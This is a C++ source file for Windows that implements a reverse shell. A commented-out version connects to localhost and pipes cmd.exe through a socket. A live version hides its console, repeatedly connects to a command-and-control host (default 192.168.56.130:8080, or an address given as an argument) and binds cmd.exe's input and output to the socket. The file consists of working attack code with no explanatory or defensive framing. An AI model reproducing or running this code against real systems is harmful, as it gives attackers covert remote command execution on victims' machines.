//#include <iostream>
//#include <WinSock2.h>
//#include <process.h>
//#pragma comment(lib, "ws2_32.lib")
//#define ip "127.0.0.1"
//#define port 1234
//HANDLE g_hChildStd_IN_Rd = NULL;
//HANDLE g_hChildStd_IN_Wr = NULL;
//HANDLE g_hChildStd_OUT_Rd = NULL;
//HANDLE g_hChildStd_OUT_Wr = NULL;
//HANDLE hThread;
//HANDLE hThrecv;
//PROCESS_INFORMATION pi;
//STARTUPINFO si;
//HANDLE hThsend;
//using namespace std;
//
//unsigned __stdcall recvThread(void* pArgument)
//{
//	SOCKET* x = reinterpret_cast<SOCKET*> (pArgument);
//	DWORD recv_size = 0;
//	bool bsuccess = false;
//	char buf[4096];
//	ZeroMemory(buf, sizeof(buf));
//	while (1)
//	{
//		ZeroMemory(buf, sizeof(buf));
//		recv_size = recv(*x, buf, 4096, 0);
//		if (recv_size <= 0)
//		{
//			bsuccess = WriteFile(g_hChildStd_IN_Wr, "exit\n", 5, NULL, 0);
//		}
//		bsuccess = WriteFile(g_hChildStd_IN_Wr, buf, recv_size, NULL, 0);
//		if (!bsuccess)
//			return 1 ;
//	}
//}
//unsigned __stdcall sendThread(void* pArgument)
//{
//	SOCKET* x = reinterpret_cast<SOCKET*> (pArgument);
//	DWORD dwRead = 0, nsend = 0;
//	char buf[4096];
//	bool bsuccess = false;
//	while (1)
//	{
//		ZeroMemory(buf, sizeof(buf));
//		bsuccess = ReadFile(g_hChildStd_OUT_Rd, buf, 4095, &dwRead, 0);
//		if (!bsuccess || dwRead <= 0)
//			break;
//		nsend = send(*x, buf, strlen(buf), 0);
//		if (nsend <= 0)
//		{
//			TerminateProcess(pi.hProcess, 0);
//			break;
//		}
//	}
//	return 1;
//}
//int main()
//{
//	while (1)
//	{
//		Sleep(1000);
//		SOCKET s;
//		WSADATA wsa;
//		sockaddr_in addr;
//		if (WSAStartup(MAKEWORD(2, 2), &wsa))
//		{
//			continue;
//		}
//		if ((s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)) == INVALID_SOCKET)
//		{
//			WSACleanup();
//			continue;
//		}
//		addr.sin_family = AF_INET;
//		addr.sin_port = htons(port);
//		addr.sin_addr.s_addr = inet_addr(ip);
//		if (WSAConnect(s, (struct sockaddr*) & addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
//		{
//			closesocket(s);
//			WSACleanup();
//			continue;
//		}
//		SECURITY_ATTRIBUTES sa;
//		sa.nLength = sizeof(sa);
//		sa.bInheritHandle = true;
//		sa.lpSecurityDescriptor = NULL;
//		if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &sa, 0))
//			return 1;
//		if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
//			return 1;
//		//
//		if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0))
//			return 1;
//		if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
//			return 1;
//		ZeroMemory(&pi, sizeof(pi));
//		ZeroMemory(&si, sizeof(si));
//		si.cb = sizeof(si);
//		si.hStdError = g_hChildStd_OUT_Wr;
//		si.hStdOutput = g_hChildStd_OUT_Wr;
//		si.hStdInput = g_hChildStd_IN_Rd;
//		si.dwFlags = STARTF_USESTDHANDLES;
//		if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, true, 0, NULL, NULL, &si, &pi))
//		{
//			cout << GetLastError() << endl;
//			continue;
//		}
//		SOCKET s1 = s;
//		SOCKET s2 = s;
//		hThsend = (HANDLE)_beginthreadex(NULL, 0, &sendThread, &s1, 0, NULL);
//		hThrecv = (HANDLE)_beginthreadex(NULL, 0, &recvThread, &s2, 0, NULL);
//		
//		WaitForSingleObject(pi.hProcess, INFINITE);
//		CloseHandle(pi.hProcess);
//		CloseHandle(pi.hThread);
//		CloseHandle(g_hChildStd_OUT_Wr);
//		CloseHandle(g_hChildStd_IN_Rd);
//	}
//	return 0;
//}

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void RunShell(char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);    // 1000 = One Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
        addr.sin_port = htons(C2Port);     //Port received from main function

        //Connecting to Proxy/ProxyIP/C2Host
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                TCHAR Process[] = L"cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}
//-----------------------------------------------------------
//-----------------------------------------------------------
//-----------------------------------------------------------
int main(int argc, char** argv) {
    FreeConsole();
    if (argc == 3) {
        int port = atoi(argv[2]); //Converting port in Char datatype to Integer format
        RunShell(argv[1], port);
    }
    else {
        char host[] = "192.168.56.130";
        int port = 8080;
        RunShell(host, port);
    }
    return 0;
}